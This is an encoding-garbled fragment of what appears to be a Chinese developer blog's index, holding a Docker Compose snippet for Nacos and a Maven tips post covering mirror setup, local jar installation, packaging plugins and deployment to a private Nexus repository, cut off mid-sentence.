/usr/local/etc/redis/redis.conf Docker Compose æŒ‡å®šç½‘ç»œæ¨¡å¼ 12345678910111213141516version: "2"services: nacos: image: nacos/nacos-server:latest container_name: nacos-standalone-mysql env_file: - /usr/nacos/env/nacos-standlone-mysql.env volumes: - /usr/nacos/logs/:/home/nacos/logs - /usr/nacos/init.d/custom.properties:/home/nacos/init.d/custom.properties ports: - "8848:8848" - "9555:9555" network_mode: host restart: on-failure å‚è€ƒèµ„æ–™ Docker Compose èœé¸Ÿæ•™ç¨‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Maven å¼€å‘éšç¬”",url:"/posts/5fee1c55.html",text:'Maven å¸¸è§„é…ç½®Maven è°ƒè¯•æŠ€å·§ mvn dependency:treeï¼Œæ‰“å°ä¾èµ–æ ‘ mvn clean -Xï¼Œä½¿ç”¨ -X å‚æ•°è¾“å‡ºè¯¦ç»†çš„æ—¥å¿—ä¿¡æ¯ mvn -Xï¼ŒæŸ¥çœ‹å½“å‰ç”Ÿæ•ˆçš„æ˜¯å“ªä¸ª settings.xml é…ç½®æ–‡ä»¶ mvn help:effective-settingsï¼ŒæŸ¥çœ‹æ­£åœ¨èµ·ä½œç”¨çš„æ˜¯é‚£ä¸ª settings.xml çš„æ–‡ä»¶å†…å®¹ æ·»åŠ é˜¿é‡Œäº‘é•œåƒä»“åº“å…¨å±€é…ç½® æ·»åŠ é˜¿é‡Œäº‘çš„é•œåƒåˆ° Maven çš„ setting.xml é…ç½®æ–‡ä»¶ä¸­ï¼Œè¿™æ ·å°±ä¸éœ€è¦æ¯æ¬¡åœ¨ pom.xml ä¸­æ·»åŠ é•œåƒä»“åº“çš„é…ç½®å†…å®¹ï¼Œåœ¨ &lt;mirrors&gt; èŠ‚ç‚¹é‡Œæ·»åŠ å¯¹åº”çš„å­èŠ‚ç‚¹å³å¯ï¼š 1234567891011121314&lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;https://maven.aliyun.com/repository/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;repo2&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt; &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt; &lt;/mirror&gt;&lt;/mirrors&gt; å•é¡¹ç›®é…ç½® å•é¡¹ç›®é…ç½®æ—¶ï¼Œéœ€è¦ä¿®æ”¹é¡¹ç›®çš„ pom.xml æ–‡ä»¶ï¼Œé€šè¿‡è¦†ç›–é»˜è®¤çš„ä¸­å¤®ä»“åº“çš„é…ç½®ï¼Œå®ç°ä¸­å¤®ä»“åº“åœ°å€çš„å˜æ›´ 12345678910111213141516&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;central&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;https://maven.aliyun.com/repository/public/&lt;/url&gt; &lt;layout&gt;default&lt;/layout&gt; &lt;!-- æ˜¯å¦å¼€å¯å‘å¸ƒç‰ˆæ„ä»¶ä¸‹è½½ --&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;!-- æ˜¯å¦å¼€å¯å¿«ç…§ç‰ˆæ„ä»¶ä¸‹è½½ --&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒMaven é»˜è®¤ä¸­å¤®ä»“åº“çš„ id ä¸º centralã€‚å…¶ä¸­ id æ˜¯å”¯ä¸€çš„ï¼Œå› æ­¤ä½¿ç”¨ &lt;id&gt;central&lt;/id&gt; å°±å¯ä»¥è¦†ç›–é»˜è®¤çš„ä¸­å¤®ä»“åº“ Maven æ‰“åŒ…è·³è¿‡æµ‹è¯•ç”¨ä¾‹ ä½¿ç”¨å‘½ä»¤ mvn install -DskipTestsï¼Œä¸æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹ï¼Œä½†ä¼šç¼–è¯‘æµ‹è¯•ç”¨ä¾‹ç±»çš„ä»£ç  ä½¿ç”¨å‘½ä»¤ mvn install -Dmaven.test.skip=trueï¼Œä¸ä½†è·³è¿‡å•å…ƒæµ‹è¯•çš„è¿è¡Œï¼Œä¹Ÿè·³è¿‡å•å…ƒæµ‹è¯•ä»£ç çš„ç¼–è¯‘ ä½¿ç”¨ Maven æ’ä»¶çš„é…ç½®å¦‚ä¸‹ï¼š 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;configuration&gt; &lt;skipTests&gt;true&lt;/skipTests&gt; &lt;!-- &lt;skip&gt;true&lt;/skip&gt; --&gt; &lt;/configuration&gt;&lt;/plugin&gt; Maven æŒ‡å®šç¼–è¯‘çš„ JDK ç‰ˆæœ¬æ–¹å¼ä¸€ 1234&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;&lt;/properties&gt; æ–¹æ³•äºŒ 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;/configuration&gt;&lt;/plugin&gt; æ–¹æ³•ä¸‰ è¯¥æ–¹å¼å¹¶é Maven å®˜æ–¹é…ç½®ï¼Œè¦ä½¿è¯¥æ–¹å¼èƒ½å¤Ÿç”Ÿæ•ˆé¦–å…ˆå¿…é¡»æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š é¡¹ç›®ä¸ºä¸€ä¸ª SpringBoot å·¥ç¨‹ é¡¹ç›®çš„ POM ç»§æ‰¿äº† spring-boot-starter-parent 123456789&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt;&lt;/properties&gt; Maven å¼•å…¥æœ¬åœ° Jar åŒ…æ–¹æ³•ä¸€ï¼ˆæ¨èï¼‰ é€šè¿‡ mvn install å‘½ä»¤æ‰‹åŠ¨å°† Jar åŒ…å®‰è£…åˆ° Maven æœ¬åœ°ä»“åº“ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œç›¸å…³èµ„æ–™å¯å‚è€ƒè¿™é‡Œ 1$ mvn install:install-file -Dfile=taobao-sdk-java-auto.jar -DgroupId=com.dingtalk -DartifactId=dingtalk-api-sdk -Dversion=1.0.0-SNAPSHOT -Dpackaging=jar æœ€ååœ¨ pom.xml é‡Œæ­£å¸¸å¼•å…¥å¯¹åº”çš„ä¾èµ–å³å¯ï¼š 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; è‹¥éœ€è¦ä»æœ¬åœ°ä»“åº“å¸è½½ç‰¹å®šçš„æœ¬åœ° Jar åŒ…ï¼Œå¯ä»¥åœ¨ pom.xml æ‰€åœ¨ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå…¶ä¸­ -DmanualInclude çš„å‚æ•°æ ¼å¼ä¸º groupId:artifactId 12345# ä»Mavenæœ¬åœ°ä»“åº“å¸è½½æŸä¸ªJaråŒ…$ mvn dependency:purge-local-repository -DmanualInclude="com.dingtalk:dingtalk-api-sdk"# é˜»æ­¢Mavenå¯¹å·²åˆ é™¤çš„JaråŒ…è¿›è¡ŒReResolve$ mvn dependency:purge-local-repository -DreResolve=false æ–¹æ³•äºŒï¼ˆæ¨èï¼‰ é€šè¿‡ Maven æ’ä»¶å°†æœ¬åœ° Jar åŒ…å®‰è£…åˆ° Maven æœ¬åœ°ä»“åº“ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œéœ€è¦æ‰‹åŠ¨æ‰§è¡Œ mvn clean &amp;&amp; mvn install å‘½ä»¤å°†æœ¬åœ° Jar åŒ…å®‰è£…åˆ° Maven æœ¬åœ°ä»“åº“ï¼Œç›¸å…³èµ„æ–™å¯å‚è€ƒè¿™é‡Œ 123456789101112131415161718192021222324252627&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt; &lt;version&gt;2.5.2&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;install-external&lt;/id&gt; &lt;phase&gt;clean&lt;/phase&gt; &lt;configuration&gt; &lt;file&gt;${project.basedir}/lib/taobao-sdk-java-auto.jar&lt;/file&gt; &lt;repositoryLayout&gt;default&lt;/repositoryLayout&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;generatePom&gt;true&lt;/generatePom&gt; &lt;/configuration&gt; &lt;goals&gt; &lt;goal&gt;install-file&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; æœ€ååœ¨ pom.xml é‡Œæ­£å¸¸å¼•å…¥å¯¹åº”çš„ä¾èµ–å³å¯ï¼š 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; æ–¹æ³•ä¸‰ï¼ˆä¸æ¨èï¼‰ å‡è®¾é¡¹ç›®çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š 12345marketâ”œâ”€â”€ common-apiâ”‚&nbsp;&nbsp; â””â”€â”€ libâ”‚&nbsp;&nbsp; â””â”€â”€ taobao-sdk-java-auto.jarâ””â”€â”€ common-cache åœ¨ common-api æ¨¡å—ä¸‹çš„ pom.xml æ·»åŠ ä»¥ä¸‹ä¾èµ–æ¥å¼•å…¥æœ¬åœ° Jar åŒ…ï¼š groupIdï¼šè‡ªå®šä¹‰ artifactIdï¼šè‡ªå®šä¹‰ versionï¼šè‡ªå®šä¹‰ scopeï¼šå¿…é¡»æ˜¯ system systemPathï¼šJar åŒ…çš„è·¯å¾„ï¼Œ${project.basedir} æ˜¯æŒ‡å½“å‰ pom.xml æ‰€åœ¨çš„ç›®å½• 1234567&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${project.basedir}/lib/taobao-sdk-java-auto.jar&lt;/systemPath&gt;&lt;/dependency&gt; è‹¥ common-api æ¨¡å—æ˜¯æ™®é€š Maven é¡¹ç›®ï¼Œé‚£ä¹ˆæ‰“åŒ…æ—¶éœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œç›®çš„æ˜¯å°†æœ¬åœ° Jar åŒ…åŒæ—¶æ‰“åŒ…åœ¨ä¸€èµ·ï¼š directoryï¼šæŒ‡å®š lib æ–‡ä»¶å¤¹çš„ä½ç½®ï¼Œä¸€èˆ¬ç›´æ¥å†™ä¸Š ${project.basedir}/lib å³å¯ targetPathï¼šæ‰“åŒ…åˆ°çš„æ–‡ä»¶å¤¹ä½ç½®ï¼Œå†™ä¸Š BOOT-INF/lib å³å¯ï¼Œæˆ–è€…æ˜¯ WEB-INF/lib includesï¼šä¸€èˆ¬éƒ½æ˜¯ä»¥ .jar ç»“å°¾ï¼Œç›´æ¥å†™ **/*.jar å³å¯ 123456789101112131415161718&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;${project.basedir}/lib&lt;/directory&gt; &lt;targetPath&gt;/BOOT-INF/lib/&lt;/targetPath&gt; &lt;includes&gt; &lt;include&gt;**/*.jar&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.*&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt; è‹¥ common-api æ¨¡å—æ˜¯ SpringBoot é¡¹ç›®ï¼Œé‚£ä¹ˆæ‰“åŒ…æ—¶éœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œç›®çš„æ˜¯å°†æœ¬åœ° Jar åŒ…åŒæ—¶æ‰“åŒ…åœ¨ä¸€èµ·ï¼š 1234567891011&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; Maven å•å…ƒæµ‹è¯•æ‹·è´èµ„æºæ–‡ä»¶@SpringBootTest æ³¨è§£ï¼Œåªä¼šåŠ è½½ src/test è·¯å¾„ä¸‹çš„èµ„æºæ–‡ä»¶ï¼ˆå¦‚ XML é…ç½®ï¼‰ï¼Œå¹¶ä¸ä¼šåŠ è½½ src/main è·¯å¾„ä¸‹çš„èµ„æºæ–‡ä»¶ã€‚è‹¥éœ€è¦åœ¨æ‰§è¡Œå•å…ƒæµ‹è¯•æ—¶ï¼ŒåŠ è½½ src/main è·¯å¾„ä¸‹çš„èµ„æºæ–‡ä»¶ï¼Œéœ€è¦è®© Maven æ‹·è´å¯¹åº”çš„èµ„æºæ–‡ä»¶åˆ° src/test è·¯å¾„ä¸‹ï¼š 1234567891011121314151617181920&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.*&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;!--å•å…ƒæµ‹è¯•æ—¶å¼•ç”¨src/main/resourcesä¸‹çš„èµ„æºæ–‡ä»¶--&gt; &lt;testResources&gt; &lt;testResource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;/testResource&gt; &lt;testResource&gt; &lt;directory&gt;src/test/resources&lt;/directory&gt; &lt;/testResource&gt; &lt;/testResources&gt;&lt;/build&gt; æœ‰æ—¶å€™å¼€å‘ä¸€ä¸ªå…¬å…± Jar åŒ…ç»™åˆ«äººå¼•ç”¨ï¼Œå½“åˆ«äººæ‰“å¼€åŒ…ä¸­çš„ç±»çš„æ—¶å€™ï¼Œé»˜è®¤æƒ…å†µä¸‹æ‰“å¼€çš„æ˜¯ IDE å·¥å…·åç¼–è¯‘å‡ºæ¥çš„ .class æ–‡ä»¶ï¼Œç±»ä¸­çš„æ³¨é‡Šä»€ä¹ˆçš„éƒ½çœ‹ä¸åˆ°ï¼Œæ­¤æ—¶ IDE å·¥å…·ä¼šæç¤ºå¯ä»¥ Download Sourcesï¼Œä½†æ˜¯å¦‚æœæ‰“åŒ…çš„æ—¶å€™æ²¡æœ‰åŒæ—¶æ‰“ä¸€ä¸ªä»¥ -sources.jar ç»“å°¾çš„æºç  Jar åŒ…ï¼Œé‚£ä¹ˆè°ƒç”¨æ–¹ä¸‹è½½æºç åŒ…çš„æ—¶å€™å°±ä¼šå¤±è´¥ã€‚maven-source æ’ä»¶å°±æ˜¯ç”¨æ¥æ‰“åŒ…æºç çš„ï¼Œå¯ä»¥éƒ¨ç½²åˆ°ç§æœ‰ä»“åº“ä¸Šçš„ï¼Œå¯¹äºéœ€è¦æŸ¥çœ‹æºç ã€æ³¨é‡Šå’Œè°ƒè¯•ä»£ç ï¼Œæœ‰å¾ˆå¤§çš„å¸®åŠ©ã€‚ 123456789101112&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;attach-sources&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt;&lt;/plugin&gt; Mave å°†æ‰€æœ‰ä¾èµ–åŒ…æ‰“åŒ…åœ¨å•ä¸ª Jar åŒ…è‹¥ Maven æ‰“åŒ…æ—¶ï¼Œéœ€è¦å°†é¡¹ç›®æºç ä¸æ‰€æœ‰ä¾èµ–åŒ…ä¸€èµ·æ‰“åŒ…åœ¨å•ä¸ª Jar æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹é…ç½®ï¼š 12345678910111213141516171819202122&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; Maven å°†é¡¹ç›®ä¸­çš„æµ‹è¯•ä»£ç æ‰“åŒ…è¿› Jar åŒ… Maven æ”¯æŒæ‰“åŒ…çš„æ’ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š plugin function maven-jar-plugin maven é»˜è®¤æ‰“åŒ…æ’ä»¶ï¼Œç”¨æ¥åˆ›å»º project jar maven-shade-plugin ç”¨æ¥æ‰“å¯æ‰§è¡ŒåŒ…ï¼Œexecutable (fat) jar maven-assembly-plugin æ”¯æŒå®šåˆ¶åŒ–æ‰“åŒ…æ–¹å¼ï¼Œä¾‹å¦‚ apache é¡¹ç›®çš„æ‰“åŒ…æ–¹å¼ æ·»åŠ  maven-assembly-plugin æ’ä»¶ï¼š 1234567891011121314151617&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;descriptors&gt;src/main/resources/assembly.xml&lt;/descriptors&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt;&lt;/plugin&gt; è¿˜å¯ä»¥åœ¨ä¸Šé¢çš„ configuration èŠ‚ç‚¹ä¸­æŒ‡å®šæ‰§è¡Œ Jar åŒ…æ—¶çš„ Test ä¸»ç±»ï¼š 12345678&lt;configuration&gt; &lt;descriptors&gt;src/main/resources/assembly.xml&lt;/descriptors&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;com.sample.TestMain&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt;&lt;/configuration&gt; åˆ›å»º assembly.xml é…ç½®æ–‡ä»¶ï¼š 123456789101112131415161718192021222324252627282930313233&lt;assembly xmlns="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3 http://maven.apache.org/xsd/assembly-1.1.3.xsd"&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;formats&gt; &lt;format&gt;jar&lt;/format&gt; &lt;/formats&gt; &lt;includeBaseDirectory&gt;false&lt;/includeBaseDirectory&gt; &lt;dependencySets&gt; &lt;dependencySet&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt; &lt;unpack&gt;true&lt;/unpack&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependencySet&gt; &lt;/dependencySets&gt; &lt;fileSets&gt; &lt;fileSet&gt; &lt;directory&gt;${project.build.directory}/test-classes&lt;/directory&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;includes&gt; &lt;include&gt;**/*.class&lt;/include&gt; &lt;/includes&gt; &lt;useDefaultExcludes&gt;true&lt;/useDefaultExcludes&gt; &lt;/fileSet&gt; &lt;/fileSets&gt;&lt;/assembly&gt; ç‰¹åˆ«æ³¨æ„ï¼šä¸Šé¢ assembly.xml é‡Œçš„é…ç½®ï¼Œé»˜è®¤ä¼šå°†æ‰€æœ‰ Jar åŒ…çš„æºç ä¸€èµ·æ‰“åŒ…ï¼ˆåŒ…æ‹¬ä¾èµ–çš„ç¬¬ä¸‰æ–¹ Jar åŒ…ï¼‰ï¼Œå¦‚æœåªå¸Œæœ›æ‰“åŒ…é¡¹ç›®è‡ªèº«çš„æºç ï¼Œé‚£ä¹ˆåˆ™éœ€è¦æ·»åŠ  exclude èŠ‚ç‚¹æ¥æ’é™¤ä¾èµ–ï¼š 123456789101112131415161718192021222324252627282930313233343536373839&lt;assembly xmlns="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3 http://maven.apache.org/xsd/assembly-1.1.3.xsd"&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;formats&gt; &lt;format&gt;jar&lt;/format&gt; &lt;/formats&gt; &lt;includeBaseDirectory&gt;false&lt;/includeBaseDirectory&gt; &lt;dependencySets&gt; &lt;dependencySet&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt; &lt;unpack&gt;true&lt;/unpack&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;excludes&gt; &lt;exclude&gt;org.slf4j:slf4j-api&lt;/exclude&gt; &lt;exclude&gt;com.fasterxml.jackson.core:*&lt;/exclude&gt; &lt;exclude&gt;org.apache.httpcomponents:*&lt;/exclude&gt; &lt;exclude&gt;com.google.guava:guava&lt;/exclude&gt; &lt;/excludes&gt; &lt;/dependencySet&gt; &lt;/dependencySets&gt; &lt;fileSets&gt; &lt;fileSet&gt; &lt;directory&gt;${project.build.directory}/test-classes&lt;/directory&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;includes&gt; &lt;include&gt;**/*.class&lt;/include&gt; &lt;/includes&gt; &lt;useDefaultExcludes&gt;true&lt;/useDefaultExcludes&gt; &lt;/fileSet&gt; &lt;/fileSets&gt;&lt;/assembly&gt; è¿è¡Œä»¥ä¸‹æ‰“åŒ…å‘½ä»¤ï¼Œä¼šç”Ÿæˆ xxxx-1.0.0-SNAPSHOT-assembly.jar æ–‡ä»¶ï¼Œå…¶ä¸­æ–‡ä»¶åé‡Œçš„ assembly æ˜¯ç”± assembly.xml é…ç½®æ–‡ä»¶é‡Œçš„ id èŠ‚ç‚¹æŒ‡å®šï¼š 1$ mvn package Maven ç§æœ‰ä»“åº“é…ç½®é€šè¿‡æ’ä»¶ä¸Šä¼  Jar åŒ…åˆ°ç§æœ‰ä»“åº“ç¼–è¾‘ Maven çš„ settings.xml é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡æ·»åŠ  server èŠ‚ç‚¹æ¥é…ç½®ç§æœ‰ä»“åº“çš„è´¦å·å’Œå¯†ç ï¼Œè¿™é‡Œçš„ id å¯ä»¥éšä¾¿å–åå­—ï¼Œä½†å¿…é¡»ä¸ä¸‹é¢é…ç½®çš„ id ä¸€è‡´ï¼š 1234567891011&lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt;&lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt; ç¼–è¾‘ Maven çš„ settings.xml é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡æ·»åŠ  mirror èŠ‚ç‚¹æ¥é…ç½®ç§æœ‰ä»“åº“çš„åœ°å€ï¼Œè¿™é‡Œçš„ id å¿…é¡»å’Œä¸Šé¢ server èŠ‚ç‚¹çš„ id ä¸€è‡´ï¼š 12345678910111213&lt;mirror&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;nexus maven releases repo&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/releases/&lt;/url&gt;&lt;/mirror&gt;&lt;mirror&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;nexus maven snapshots repo&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt;&lt;/mirror&gt; ç¼–è¾‘é¡¹ç›®çš„ pom.xml æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œè¿™é‡Œçš„ id å¿…é¡»ä¸ ä¸Šé¢ mirror èŠ‚ç‚¹é‡Œçš„ id ä¸€è‡´ï¼š 1234567891011121314&lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;name&gt;Nexus Snapshots Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/repository&gt; &lt;!-- &lt;repository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;name&gt;Nexus Releases Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/releases/&lt;/url&gt; &lt;/repository&gt; --&gt;&lt;/distributionManagement&gt; æ‰§è¡Œå‘å¸ƒå‘½ä»¤ï¼š 1$ maven clean deploy Maven å¸¸è§é—®é¢˜è§£å†³ä¸Šä¼  Jar åŒ…åˆ°ç§æœ‰ä»“åº“å‡ºç° 400 é”™è¯¯ç ä¸€èˆ¬æœ‰ 3 ä¸ªå¯¼è‡´å‡ºç°ä¸Šé¢é—®é¢˜çš„åŸå› ï¼š ä¸€ã€pom.xml ä¸­ä»“åº“ id é…ç½®ä¸å¯¹ï¼Œæ£€æŸ¥ pom.xml ä¸­é…ç½®çš„ distributionManagement ä¸­çš„ä»“åº“ idã€url å’Œç§æœ Nexus ä¸­çš„æ˜¯å¦ç›¸åŒ 1234567&lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;name&gt;Nexus Snapshots Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/repository&gt;&lt;/distributionManagement&gt; äºŒã€ç§æœ Nexus å·²ç»å­˜åœ¨ç›¸åŒç‰ˆæœ¬ä¸”ä»£ç å®Œå…¨ä¸€æ ·çš„ Jar åŒ…ï¼ŒåŒæ—¶éƒ¨ç½²ç­–ç•¥ä¸ºä¸å…è®¸è¦†ç›–ï¼›æ­¤æ—¶åªéœ€è¦å°†ä»“åº“å¯¹åº”çš„ Deployment Policy è®¾ç½®ä¸º Allow Redeploy å³å¯ ä¸‰ã€å¦‚æœ Repository Policy ä¸º Releaseï¼Œåˆ™éƒ¨ç½² Jar åŒ…çš„ç‰ˆæœ¬å·ä¸­ä¸å…è®¸å‡ºç° snapshot å…³é”®å­—ï¼›ç‰¹åˆ«æ³¨æ„ï¼ŒRepository Policy 